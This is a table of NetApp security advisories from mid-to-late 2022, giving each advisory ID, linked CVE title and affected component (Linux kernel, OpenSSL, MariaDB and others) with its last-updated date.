| [**NTAP-20221007-0002**](https://security.netapp.com/advisory/ntap-20221007-0002/) | CVE-2022-1664 Dpkg Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20221007-0003**](https://security.netapp.com/advisory/ntap-20221007-0003/) | CVE-2022-24407 Cyrus SASL Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20221007-0005**](https://security.netapp.com/advisory/ntap-20221007-0005/) | CVE-2022-26373 Intel Processor Vulnerability in NetApp Products | 2022-10-07 |
| [**NTAP-20221007-0006**](https://security.netapp.com/advisory/ntap-20221007-0006/) | CVE-2022-28693 Intel Processor Vulnerability in NetApp Products | 2022-10-07 |
| [**NTAP-20221007-0007**](https://security.netapp.com/advisory/ntap-20221007-0007/) | CVE-2022-29901 Intel Processor Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20220930-0004**](https://security.netapp.com/advisory/ntap-20220930-0004/) | CVE-2021-33060 Intel BIOS Firmware Vulnerability in NetApp Products | 2023-12-20 |
| [**NTAP-20220930-0006**](https://security.netapp.com/advisory/ntap-20220930-0006/) | CVE-2022-1271 GNU Gzip Vulnerability in NetApp Products | 2022-10-17 |
| [**NTAP-20220930-0007**](https://security.netapp.com/advisory/ntap-20220930-0007/) | CVE-2022-1619 Vim Vulnerability in NetApp Products | 2022-10-07 |
| [**NTAP-20220930-0003**](https://security.netapp.com/advisory/ntap-20220930-0003/) | CVE-2022-26074 Intel SPS Vulnerability in NetApp Products | 2022-09-30 |
| [**NTAP-20220930-0002**](https://security.netapp.com/advisory/ntap-20220930-0002/) | CVE-2022-34526 LibTIFF Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20220930-0005**](https://security.netapp.com/advisory/ntap-20220930-0005/) | CVE-2022-35252 cURL/libcURL Vulnerability in NetApp Products | 2023-08-02 |
| [**NTAP-20220930-0001**](https://security.netapp.com/advisory/ntap-20220930-0001/) | July 2022 Grub Vulnerabilities in NetApp Products | 2022-10-28 |
| [**NTAP-20220926-0001**](https://security.netapp.com/advisory/ntap-20220926-0001/) | CVE-2022-38732 Missing Content Security Policy in SnapCenter | 2022-09-28 |
| [**NTAP-20220923-0005**](https://security.netapp.com/advisory/ntap-20220923-0005/) | CVE-2022-1996 go-restful Vulnerability in NetApp Products | 2022-10-07 |
| [**NTAP-20220923-0001**](https://security.netapp.com/advisory/ntap-20220923-0001/) | CVE-2022-20824 Cisco Discovery Protocol Denial of Service and Arbitrary Code Execution Vulnerability | 2022-09-23 |
| [**NTAP-20220923-0002**](https://security.netapp.com/advisory/ntap-20220923-0002/) | CVE-2022-21233 Intel Processor Vulnerability in NetApp Products | 2022-09-23 |
| [**NTAP-20220923-0004**](https://security.netapp.com/advisory/ntap-20220923-0004/) | CVE-2022-27664 Golang Vulnerability in NetApp Products | 2023-03-07 |
| [**NTAP-20220923-0006**](https://security.netapp.com/advisory/ntap-20220923-0006/) | CVE-2022-28948 Go-Yaml Vulnerability in NetApp Products | 2022-11-15 |
| [**NTAP-20220923-0003**](https://security.netapp.com/advisory/ntap-20220923-0003/) | CVE-2022-32189 Golang Vulnerability in NetApp Products | 2022-10-12 |
| [**NTAP-20220915-0010**](https://security.netapp.com/advisory/ntap-20220915-0010/) | April 2022 Golang Vulnerabilities in NetApp Products | 2022-10-11 |
| [**NTAP-20220915-0005**](https://security.netapp.com/advisory/ntap-20220915-0005/) | CVE-2021-4209 GnuTLS Vulnerability in NetApp Products | 2023-03-07 |
| [**NTAP-20220915-0006**](https://security.netapp.com/advisory/ntap-20220915-0006/) | CVE-2022-2309 lxml Vulnerability in NetApp Products | 2022-12-01 |
| [**NTAP-20220915-0007**](https://security.netapp.com/advisory/ntap-20220915-0007/) | CVE-2022-25168 Apache Hadoop Vulnerability in NetApp Products | 2022-09-15 |
| [**NTAP-20220915-0002**](https://security.netapp.com/advisory/ntap-20220915-0002/) | CVE-2022-31150 Node.js Vulnerability in NetApp Products | 2022-12-12 |
| [**NTAP-20220915-0009**](https://security.netapp.com/advisory/ntap-20220915-0009/) | CVE-2022-35737 SQLite Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220915-0008**](https://security.netapp.com/advisory/ntap-20220915-0008/) | CVE-2022-36359 Django Vulnerability in NetApp Products | 2022-10-17 |
| [**NTAP-20220915-0004**](https://security.netapp.com/advisory/ntap-20220915-0004/) | July 2022 Golang Vulnerabilities in NetApp Products | 2023-01-13 |
| [**NTAP-20220915-0003**](https://security.netapp.com/advisory/ntap-20220915-0003/) | July 2022 Libcurl Vulnerabilities in NetApp Products | 2023-05-10 |
| [**NTAP-20220915-0001**](https://security.netapp.com/advisory/ntap-20220915-0001/) | July 2022 Node.js Vulnerabilities in NetApp Products | 2022-11-21 |
| [**NTAP-20220909-0001**](https://security.netapp.com/advisory/ntap-20220909-0001/) | CVE-2018-1285 Apache Log4net Vulnerability in NetApp Products | 2022-09-09 |
| [**NTAP-20220909-0004**](https://security.netapp.com/advisory/ntap-20220909-0004/) | CVE-2019-17498 Libssh2 Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220909-0003**](https://security.netapp.com/advisory/ntap-20220909-0003/) | CVE-2022-2191 Eclipse Jetty Vulnerability in NetApp Products | 2022-09-13 |
| [**NTAP-20220909-0002**](https://security.netapp.com/advisory/ntap-20220909-0002/) | CVE-2022-31144 Redis Vulnerability in NetApp Products | 2022-12-01 |
| [**NTAP-20220909-0006**](https://security.netapp.com/advisory/ntap-20220909-0006/) | CVE-2022-31151 Node.js Vulnerability in NetApp Products | 2022-12-01 |
| [**NTAP-20220909-0007**](https://security.netapp.com/advisory/ntap-20220909-0007/) | CVE-2022-31160 jQuery Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20220909-0005**](https://security.netapp.com/advisory/ntap-20220909-0005/) | CVE-2022-36313 Node.js Vulnerability in NetApp Products | 2022-11-21 |
| [**NTAP-20220901-0006**](https://security.netapp.com/advisory/ntap-20220901-0006/) | August 2022 Eclipse Jetty Vulnerabilities in NetApp Products | 2023-02-16 |
| [**NTAP-20220901-0012**](https://security.netapp.com/advisory/ntap-20220901-0012/) | CVE-2020-28445 Node.js Vulnerability in NetApp Products | 2022-12-12 |
| [**NTAP-20220901-0008**](https://security.netapp.com/advisory/ntap-20220901-0008/) | CVE-2022-1651 Linux Kernel Vulnerability in NetApp Products | 2022-09-30 |
| [**NTAP-20220901-0004**](https://security.netapp.com/advisory/ntap-20220901-0004/) | CVE-2022-1671 Linux Kernel Vulnerability in NetApp Products | 2022-09-26 |
| [**NTAP-20220901-0001**](https://security.netapp.com/advisory/ntap-20220901-0001/) | CVE-2022-23239 Stored Cross-Site Scripting Vulnerability in Active IQ Unified Manager | 2022-09-01 |
| [**NTAP-20220901-0002**](https://security.netapp.com/advisory/ntap-20220901-0002/) | CVE-2022-23240 Improper Authorization Vulnerability in Active IQ Unified Manager | 2022-09-01 |
| [**NTAP-20220901-0009**](https://security.netapp.com/advisory/ntap-20220901-0009/) | CVE-2022-25647 Google Gson Vulnerability in NetApp Products | 2024-02-29 |
| [**NTAP-20220901-0003**](https://security.netapp.com/advisory/ntap-20220901-0003/) | CVE-2022-36123 Linux Kernel Vulnerability in NetApp Products | 2022-09-26 |
| [**NTAP-20220901-0011**](https://security.netapp.com/advisory/ntap-20220901-0011/) | CVE-2022-36129 HashiCorp Vulnerability in NetApp Products | 2022-09-01 |
| [**NTAP-20220901-0005**](https://security.netapp.com/advisory/ntap-20220901-0005/) | CVE-2022-37434 Zlib Vulnerability in NetApp Products | 2024-04-05 |
| [**NTAP-20220901-0010**](https://security.netapp.com/advisory/ntap-20220901-0010/) | July 2022 Grafana Vulnerabilities in NetApp Products | 2023-03-07 |
| [**NTAP-20220901-0007**](https://security.netapp.com/advisory/ntap-20220901-0007/) | July 2022 Linux Kernel Vulnerabilities in NetApp Products | 2024-02-23 |
| [**NTAP-20220826-0002**](https://security.netapp.com/advisory/ntap-20220826-0002/) | CVE-2021-40663 Node.js Vulnerability in NetApp Products | 2022-08-31 |
| [**NTAP-20220826-0003**](https://security.netapp.com/advisory/ntap-20220826-0003/) | CVE-2022-21151 Intel Processor Vulnerability in NetApp Products | 2022-12-12 |
| [**NTAP-20220826-0008**](https://security.netapp.com/advisory/ntap-20220826-0008/) | CVE-2022-31627 PHP Vulnerability in NetApp Products | 2022-08-26 |
| [**NTAP-20220826-0006**](https://security.netapp.com/advisory/ntap-20220826-0006/) | CVE-2022-32083 MariaDB Vulnerability in NetApp Products | 2022-08-26 |
| [**NTAP-20220826-0007**](https://security.netapp.com/advisory/ntap-20220826-0007/) | CVE-2022-32086 MariaDB Vulnerability in NetApp Products | 2022-08-26 |
| [**NTAP-20220826-0005**](https://security.netapp.com/advisory/ntap-20220826-0005/) | CVE-2022-34903 GnuPG Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20220826-0004**](https://security.netapp.com/advisory/ntap-20220826-0004/) | CVE-2022-34918 Linux Kernel Vulnerability in NetApp Products | 2022-08-26 |
| [**NTAP-20220826-0001**](https://security.netapp.com/advisory/ntap-20220826-0001/) | June 2022 LibTIFF Vulnerabilities in NetApp Products | 2023-04-20 |
| [**NTAP-20220818-0001**](https://security.netapp.com/advisory/ntap-20220818-0001/) | CVE-2021-33117 Intel BIOS Firmware Vulnerability in NetApp Products | 2023-01-13 |
| [**NTAP-20220818-0002**](https://security.netapp.com/advisory/ntap-20220818-0002/) | CVE-2021-33149 Intel Processor Vulnerability in NetApp Products | 2023-01-13 |
| [**NTAP-20220818-0006**](https://security.netapp.com/advisory/ntap-20220818-0006/) | CVE-2022-34265 Django Vulnerability in NetApp Products | 2022-08-18 |
| [**NTAP-20220818-0004**](https://security.netapp.com/advisory/ntap-20220818-0004/) | Intel SA-00598 Processor Vulnerabilities in NetApp Products | 2022-12-12 |
| [**NTAP-20220818-0003**](https://security.netapp.com/advisory/ntap-20220818-0003/) | Intel SA-00601 BIOS Firmware Vulnerabilities in NetApp Products | 2022-08-18 |
| [**NTAP-20220818-0005**](https://security.netapp.com/advisory/ntap-20220818-0005/) | July 2022 MariaDB Vulnerabilities in NetApp Products | 2022-08-18 |
| [**NTAP-20220812-0001**](https://security.netapp.com/advisory/ntap-20220812-0001/) | CVE-2021-23055 NGINX Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20220812-0003**](https://security.netapp.com/advisory/ntap-20220812-0003/) | CVE-2022-26477 Systemd Vulnerability in NetApp Products | 2022-08-12 |
| [**NTAP-20220812-0006**](https://security.netapp.com/advisory/ntap-20220812-0006/) | CVE-2022-29582 Linux Kernel Vulnerability in NetApp Products | 2022-08-19 |
| [**NTAP-20220812-0002**](https://security.netapp.com/advisory/ntap-20220812-0002/) | CVE-2022-32532 Apache Shiro Vulnerability in NetApp Products | 2022-08-12 |
| [**NTAP-20220812-0004**](https://security.netapp.com/advisory/ntap-20220812-0004/) | CVE-2022-33879 Apache Tika Vulnerability in NetApp Products | 2022-08-12 |
| [**NTAP-20220812-0005**](https://security.netapp.com/advisory/ntap-20220812-0005/) | CVE-2022-35912 Grails Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20220808-0001**](https://security.netapp.com/advisory/ntap-20220808-0001/) | CVE-2022-23238 Firewall Vulnerability in StorageGRID (formerly StorageGRID Webscale) | 2022-08-08 |
| [**NTAP-20220804-0005**](https://security.netapp.com/advisory/ntap-20220804-0005/) | CVE-2017-20052 Python Vulnerability in NetApp Products | 2023-01-17 |
| [**NTAP-20220804-0003**](https://security.netapp.com/advisory/ntap-20220804-0003/) | CVE-2021-3597 Undertow Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20220804-0002**](https://security.netapp.com/advisory/ntap-20220804-0002/) | CVE-2021-3717 Wildfly Vulnerability in NetApp Products | 2022-08-26 |
| [**NTAP-20220804-0004**](https://security.netapp.com/advisory/ntap-20220804-0004/) | CVE-2022-25169 Apache Tika Vulnerability in NetApp Products | 2022-08-10 |
| [**NTAP-20220804-0001**](https://security.netapp.com/advisory/ntap-20220804-0001/) | CVE-2022-29078 Node.js Vulnerability in NetApp Products | 2022-08-31 |
| [**NTAP-20220729-0008**](https://security.netapp.com/advisory/ntap-20220729-0008/) | CVE-2021-3629 Undertow Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20220729-0003**](https://security.netapp.com/advisory/ntap-20220729-0003/) | CVE-2022-23708 Elasticsearch Vulnerability in NetApp Products | 2022-08-01 |
| [**NTAP-20220729-0001**](https://security.netapp.com/advisory/ntap-20220729-0001/) | CVE-2022-29526 Golang Vulnerability in NetApp Products | 2023-03-07 |
| [**NTAP-20220729-0005**](https://security.netapp.com/advisory/ntap-20220729-0005/) | CVE-2022-33105 Redis Vulnerability in NetApp Products | 2022-08-04 |
| [**NTAP-20220729-0006**](https://security.netapp.com/advisory/ntap-20220729-0006/) | CVE-2022-34305 Apache Tomcat Vulnerability in NetApp Products | 2022-08-26 |
| [**NTAP-20220729-0009**](https://security.netapp.com/advisory/ntap-20220729-0009/) | July 2022 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20220729-0004**](https://security.netapp.com/advisory/ntap-20220729-0004/) | July 2022 MySQL Server Vulnerabilities in NetApp Products | 2024-03-11 |
| [**NTAP-20220729-0010**](https://security.netapp.com/advisory/ntap-20220729-0010/) | July 2022 Samba Vulnerabilities in NetApp Products | 2022-07-29 |
| [**NTAP-20220729-0002**](https://security.netapp.com/advisory/ntap-20220729-0002/) | June 2022 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2022-07-29 |
| [**NTAP-20220729-0007**](https://security.netapp.com/advisory/ntap-20220729-0007/) | June 2022 IBM DB2 Vulnerabilities in NetApp Products | 2022-08-04 |
| [**NTAP-20220722-0003**](https://security.netapp.com/advisory/ntap-20220722-0003/) | CVE-2021-33036 Apache Hadoop Vulnerability in NetApp Products | 2022-07-22 |
| [**NTAP-20220722-0002**](https://security.netapp.com/advisory/ntap-20220722-0002/) | CVE-2022-1652 Linux Kernel Vulnerability in NetApp Products | 2022-08-11 |
| [**NTAP-20220722-0001**](https://security.netapp.com/advisory/ntap-20220722-0001/) | CVE-2022-1786 Linux Kernel Vulnerability in NetApp Products | 2022-08-11 |
| [**NTAP-20220722-0007**](https://security.netapp.com/advisory/ntap-20220722-0007/) | CVE-2022-29244 NPM Vulnerability in NetApp Products | 2023-11-07 |
| [**NTAP-20220722-0004**](https://security.netapp.com/advisory/ntap-20220722-0004/) | CVE-2022-30973 Apache Tika Vulnerability in NetApp Products | 2022-07-22 |
| [**NTAP-20220722-0006**](https://security.netapp.com/advisory/ntap-20220722-0006/) | CVE-2022-32981 Linux Kernel Vulnerability in NetApp Products | 2022-08-19 |
| [**NTAP-20220722-0005**](https://security.netapp.com/advisory/ntap-20220722-0005/) | July 2022 PHP Vulnerabilities in NetApp Products | 2022-08-03 |
| [**NTAP-20220715-0004**](https://security.netapp.com/advisory/ntap-20220715-0004/) | CVE-2021-33473 Ruby Gem Vulnerability in NetApp Products | 2022-07-21 |
| [**NTAP-20220715-0007**](https://security.netapp.com/advisory/ntap-20220715-0007/) | CVE-2021-37404 Apache Hadoop Vulnerability in NetApp Products | 2022-07-15 |
| [**NTAP-20220715-0001**](https://security.netapp.com/advisory/ntap-20220715-0001/) | CVE-2022-1678 Linux Kernel Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20220715-0002**](https://security.netapp.com/advisory/ntap-20220715-0002/) | CVE-2022-1882 Linux Kernel Vulnerability in NetApp Products | 2022-07-15 |
| [**NTAP-20220715-0011**](https://security.netapp.com/advisory/ntap-20220715-0011/) | CVE-2022-2097 OpenSSL Vulnerability in NetApp Products | 2024-02-29 |
| [**NTAP-20220715-0010**](https://security.netapp.com/advisory/ntap-20220715-0010/) | CVE-2022-2274 OpenSSL Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20220715-0006**](https://security.netapp.com/advisory/ntap-20220715-0006/) | CVE-2022-29824 Libxml2 Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20220715-0009**](https://security.netapp.com/advisory/ntap-20220715-0009/) | CVE-2022-29968 Linux Kernel Vulnerability in NetApp Products | 2022-08-31 |
| [**NTAP-20220715-0005**](https://security.netapp.com/advisory/ntap-20220715-0005/) | CVE-2022-32250 Linux Kernel Vulnerability in NetApp Products | 2022-08-11 |
| [**NTAP-20220715-0008**](https://security.netapp.com/advisory/ntap-20220715-0008/) | CVE-2022-32275 Grafana Vulnerability in NetApp Products | 2022-07-21 |
| [**NTAP-20220715-0003**](https://security.netapp.com/advisory/ntap-20220715-0003/) | June 2022 Redis Vulnerabilities in NetApp Products | 2022-11-04 |
| [**NTAP-20220707-0002**](https://security.netapp.com/advisory/ntap-20220707-0002/) | CVE-2022-1183 ISC BIND Vulnerability in NetApp Products | 2022-07-13 |
| [**NTAP-20220707-0007**](https://security.netapp.com/advisory/ntap-20220707-0007/) | CVE-2022-1734 Linux Kernel Vulnerability in NetApp Products | 2022-07-21 |
| [**NTAP-20220707-0009**](https://security.netapp.com/advisory/ntap-20220707-0009/) | CVE-2022-1998 Linux Kernel Vulnerability in NetApp Products | 2022-08-10 |
| [**NTAP-20220707-0008**](https://security.netapp.com/advisory/ntap-20220707-0008/) | CVE-2022-2068 OpenSSL Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220707-0010**](https://security.netapp.com/advisory/ntap-20220707-0010/) | CVE-2022-23712 Elasticsearch Vulnerability in NetApp Products | 2022-10-28 |
| [**NTAP-20220707-0004**](https://security.netapp.com/advisory/ntap-20220707-0004/) | CVE-2022-28660 Grafana Vulnerability in NetApp Products | 2022-07-07 |
| [**NTAP-20220707-0005**](https://security.netapp.com/advisory/ntap-20220707-0005/) | CVE-2022-29170 Grafana Vulnerability in NetApp Products | 2022-07-07 |
| [**NTAP-20220707-0001**](https://security.netapp.com/advisory/ntap-20220707-0001/) | CVE-2022-30594 Linux Kernel Vulnerability in NetApp Products | 2023-10-03 |
| [**NTAP-20220707-0006**](https://security.netapp.com/advisory/ntap-20220707-0006/) | June 2022 MariaDB Vulnerabilities in NetApp Products | 2022-07-07 |
| [**NTAP-20220707-0003**](https://security.netapp.com/advisory/ntap-20220707-0003/) | May 2022 Spring Security Vulnerabilities in NetApp Products | 2022-09-01 |
| [**NTAP-20220629-0008**](https://security.netapp.com/advisory/ntap-20220629-0008/) | CVE-2018-10237 Guava Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20220629-0004**](https://security.netapp.com/advisory/ntap-20220629-0004/) | CVE-2022-1116 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220629-0007**](https://security.netapp.com/advisory/ntap-20220629-0007/) | CVE-2022-1679 Linux Kernel Vulnerability in NetApp Products | 2022-06-30 |
| [**NTAP-20220629-0003**](https://security.netapp.com/advisory/ntap-20220629-0003/) | CVE-2022-25762 Apache Tomcat Vulnerability in NetApp Products | 2022-06-29 |
| [**NTAP-20220629-0009**](https://security.netapp.com/advisory/ntap-20220629-0009/) | CVE-2022-25844 AngularJS Vulnerability in NetApp Products | 2023-12-20 |
| [**NTAP-20220629-0010**](https://security.netapp.com/advisory/ntap-20220629-0010/) | CVE-2022-29218 RubyGems Vulnerability in NetApp Products | 2022-06-29 |
| [**NTAP-20220629-0005**](https://security.netapp.com/advisory/ntap-20220629-0005/) | CVE-2022-29581 Linux Kernel Vulnerability in NetApp Products | 2022-06-29 |
| [**NTAP-20220629-0002**](https://security.netapp.com/advisory/ntap-20220629-0002/) | CVE-2022-29885 Apache Tomcat Vulnerability in NetApp Products | 2022-06-29 |
| [**NTAP-20220629-0006**](https://security.netapp.com/advisory/ntap-20220629-0006/) | CVE-2022-30689 HashiCorp Vulnerability in NetApp Products | 2022-06-29 |
| [**NTAP-20220629-0001**](https://security.netapp.com/advisory/ntap-20220629-0001/) | May 2022 Linux Kernel Vulnerabilities in NetApp Products | 2022-07-21 |
| [**NTAP-20220627-0001**](https://security.netapp.com/advisory/ntap-20220627-0001/) | CVE-2022-28166 Brocade SANnav Vulnerability | 2022-06-27 |
| [**NTAP-20220627-0002**](https://security.netapp.com/advisory/ntap-20220627-0002/) | CVE-2022-28167 Brocade SANnav Vulnerability | 2022-06-27 |
| [**NTAP-20220627-0003**](https://security.netapp.com/advisory/ntap-20220627-0003/) | CVE-2022-28168 Brocade SANnav Vulnerability | 2022-06-27 |
| [**NTAP-20220624-0001**](https://security.netapp.com/advisory/ntap-20220624-0001/) | CVE-2021-3611 QEMU Vulnerability in NetApp Products | 2022-06-24 |
| [**NTAP-20220624-0003**](https://security.netapp.com/advisory/ntap-20220624-0003/) | CVE-2021-3750 QEMU Vulnerability in NetApp Products | 2022-06-24 |
| [**NTAP-20220624-0006**](https://security.netapp.com/advisory/ntap-20220624-0006/) | CVE-2022-21180 Intel Processor Vulnerability in NetApp Products | 2022-12-12 |
| [**NTAP-20220624-0007**](https://security.netapp.com/advisory/ntap-20220624-0007/) | CVE-2022-24436 Intel Processor Vulnerability in NetApp Products | 2023-01-13 |
| [**NTAP-20220624-0004**](https://security.netapp.com/advisory/ntap-20220624-0004/) | CVE-2022-30126 Apache Tika Vulnerability in NetApp Products | 2022-06-24 |
| [**NTAP-20220624-0008**](https://security.netapp.com/advisory/ntap-20220624-0008/) | Intel SA-00615 Intel Processor Vulnerabilities in NetApp Products | 2022-12-12 |
| [**NTAP-20220624-0005**](https://security.netapp.com/advisory/ntap-20220624-0005/) | June 2022 Apache HTTP Server Vulnerabilities in NetApp Products | 2023-05-22 |
| [**NTAP-20220624-0002**](https://security.netapp.com/advisory/ntap-20220624-0002/) | May 2022 Ruby Vulnerabilities in NetApp Products | 2022-06-24 |
| [**NTAP-20220616-0001**](https://security.netapp.com/advisory/ntap-20220616-0001/) | CVE-2015-20107 Python Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220616-0006**](https://security.netapp.com/advisory/ntap-20220616-0006/) | CVE-2022-22970 Spring Framework Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20220616-0003**](https://security.netapp.com/advisory/ntap-20220616-0003/) | CVE-2022-22971 Spring Framework Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20220616-0004**](https://security.netapp.com/advisory/ntap-20220616-0004/) | CVE-2022-24823 Apache Netty Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20220616-0002**](https://security.netapp.com/advisory/ntap-20220616-0002/) | CVE-2022-29176 Ruby Vulnerability in NetApp Products | 2022-06-16 |
| [**NTAP-20220616-0005**](https://security.netapp.com/advisory/ntap-20220616-0005/) | May 2022 LibTIFF Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20220609-0005**](https://security.netapp.com/advisory/ntap-20220609-0005/) | CVE-2021-32040 MongoDB Vulnerability in NetApp Products | 2022-06-09 |
| [**NTAP-20220609-0004**](https://security.netapp.com/advisory/ntap-20220609-0004/) | CVE-2021-3503 WildFly Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20220609-0001**](https://security.netapp.com/advisory/ntap-20220609-0001/) | CVE-2021-41303 Apache Shiro Vulnerability in NetApp Products | 2022-06-09 |
| [**NTAP-20220609-0003**](https://security.netapp.com/advisory/ntap-20220609-0003/) | CVE-2022-24857 Django Vulnerability in NetApp Products | 2022-06-09 |
| [**NTAP-20220609-0002**](https://security.netapp.com/advisory/ntap-20220609-0002/) | CVE-2022-28346 Django Vulnerability in NetApp Products | 2022-06-09 |
| [**NTAP-20220609-0007**](https://security.netapp.com/advisory/ntap-20220609-0007/) | CVE-2022-29155 OpenLDAP Vulnerability in NetApp Products | 2022-10-28 |
| [**NTAP-20220609-0009**](https://security.netapp.com/advisory/ntap-20220609-0009/) | June 2022 Libcurl Vulnerabilities in NetApp Products | 2023-01-26 |
| [**NTAP-20220609-0006**](https://security.netapp.com/advisory/ntap-20220609-0006/) | May 2022 Kubernetes Vulnerabilities in NetApp Products | 2022-06-09 |
| [**NTAP-20220609-0008**](https://security.netapp.com/advisory/ntap-20220609-0008/) | May 2022 Libcurl Vulnerabilities in NetApp Products | 2023-08-02 |
| [**NTAP-20220602-0007**](https://security.netapp.com/advisory/ntap-20220602-0007/) | CVE-2021-4157 Linux Kernel Vulnerability in NetApp Products | 2022-09-19 |
| [**NTAP-20220602-0006**](https://security.netapp.com/advisory/ntap-20220602-0006/) | CVE-2021-4197 Linux Kernel Vulnerability in NetApp Products | 2023-05-22 |
| [**NTAP-20220602-0001**](https://security.netapp.com/advisory/ntap-20220602-0001/) | CVE-2022-0435 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220602-0004**](https://security.netapp.com/advisory/ntap-20220602-0004/) | CVE-2022-22968 Spring Framework Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20220602-0005**](https://security.netapp.com/advisory/ntap-20220602-0005/) | CVE-2022-29153 HashiCorp Consul Vulnerability in NetApp Products | 2022-06-02 |
| [**NTAP-20220602-0002**](https://security.netapp.com/advisory/ntap-20220602-0002/) | CVE-2022-29156 Linux Kernel Vulnerability in NetApp Products | 2022-06-09 |
| [**NTAP-20220602-0003**](https://security.netapp.com/advisory/ntap-20220602-0003/) | March 2022 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2022-06-27 |
| [**NTAP-20220602-0009**](https://security.netapp.com/advisory/ntap-20220602-0009/) | May 2022 OpenSSL Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20220602-0008**](https://security.netapp.com/advisory/ntap-20220602-0008/) | May 2022 Systemd Vulnerabilities in NetApp Products | 2022-06-02 |
| [**NTAP-20220527-0001**](https://security.netapp.com/advisory/ntap-20220527-0001/) | CVE-2022-23236 Information Disclosure Vulnerability in E-Series SANtricity OS Controller Software 11.x | 2022-05-27 |
| [**NTAP-20220527-0002**](https://security.netapp.com/advisory/ntap-20220527-0002/) | CVE-2022-23237 Host Header Injection Vulnerability in E-Series SANtricity OS Controller Software 11.x | 2022-05-27 |
| [**NTAP-20220526-0007**](https://security.netapp.com/advisory/ntap-20220526-0007/) | April 2022 MariaDB v10.6.3 Vulnerabilities in NetApp Products | 2022-05-26 |
| [**NTAP-20220526-0004**](https://security.netapp.com/advisory/ntap-20220526-0004/) | April 2022 MariaDB Vulnerabilities in NetApp Products | 2022-05-26 |
| [**NTAP-20220526-0009**](https://security.netapp.com/advisory/ntap-20220526-0009/) | CVE-2018-25032 Zlib Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220526-0003**](https://security.netapp.com/advisory/ntap-20220526-0003/) | CVE-2021-29752 IBM DB2 Vulnerability in NetApp Products | 2022-05-26 |
| [**NTAP-20220526-0001**](https://security.netapp.com/advisory/ntap-20220526-0001/) | CVE-2022-0330 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220526-0005**](https://security.netapp.com/advisory/ntap-20220526-0005/) | CVE-2022-27379 MariaDB Vulnerability in NetApp Products | 2022-05-26 |
| [**NTAP-20220526-0008**](https://security.netapp.com/advisory/ntap-20220526-0008/) | CVE-2022-27385 MariaDB Vulnerability in NetApp Products | 2022-05-26 |
| [**NTAP-20220526-0002**](https://security.netapp.com/advisory/ntap-20220526-0002/) | CVE-2022-28893 Linux Kernel Vulnerability in NetApp Products | 2022-06-09 |
| [**NTAP-20220526-0006**](https://security.netapp.com/advisory/ntap-20220526-0006/) | May 2022 MariaDB Vulnerabilities in NetApp Products | 2022-05-26 |
| [**NTAP-20220519-0008**](https://security.netapp.com/advisory/ntap-20220519-0008/) | April 2022 NGINX Vulnerabilities in NetApp Products | 2024-05-09 |
| [**NTAP-20220519-0003**](https://security.netapp.com/advisory/ntap-20220519-0003/) | CVE-2021-20295 QEMU Vulnerability in NetApp Products | 2022-05-19 |
| [**NTAP-20220519-0001**](https://security.netapp.com/advisory/ntap-20220519-0001/) | CVE-2022-0500 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220519-0002**](https://security.netapp.com/advisory/ntap-20220519-0002/) | CVE-2022-0897 Libvirt Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20220519-0005**](https://security.netapp.com/advisory/ntap-20220519-0005/) | CVE-2022-24812 Grafana Vulnerability in NetApp Products | 2022-05-19 |
| [**NTAP-20220519-0004**](https://security.netapp.com/advisory/ntap-20220519-0004/) | CVE-2022-26612 Apache Hadoop Vulnerability in NetApp Products | 2022-05-19 |
| [**NTAP-20220519-0007**](https://security.netapp.com/advisory/ntap-20220519-0007/) | CVE-2022-27376 MariaDB Vulnerability in NetApp Products | 2022-05-19 |
| [**NTAP-20220519-0006**](https://security.netapp.com/advisory/ntap-20220519-0006/) | March 2022 MariaDB Vulnerabilities in NetApp Products | 2022-05-19 |
| [**NTAP-20220513-0001**](https://security.netapp.com/advisory/ntap-20220513-0001/) | April 2022 Linux Kernel 5.17.1 Vulnerabilities in NetApp Products | 2024-05-09 |
| [**NTAP-20220513-0004**](https://security.netapp.com/advisory/ntap-20220513-0004/) | CVE-2021-4147 Libvirt Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20220513-0002**](https://security.netapp.com/advisory/ntap-20220513-0002/) | CVE-2021-4202 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220513-0003**](https://security.netapp.com/advisory/ntap-20220513-0003/) | CVE-2022-0998 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220513-0005**](https://security.netapp.com/advisory/ntap-20220513-0005/) | CVE-2022-1210 LibTIFF Vulnerability in NetApp Products | 2024-04-25 |
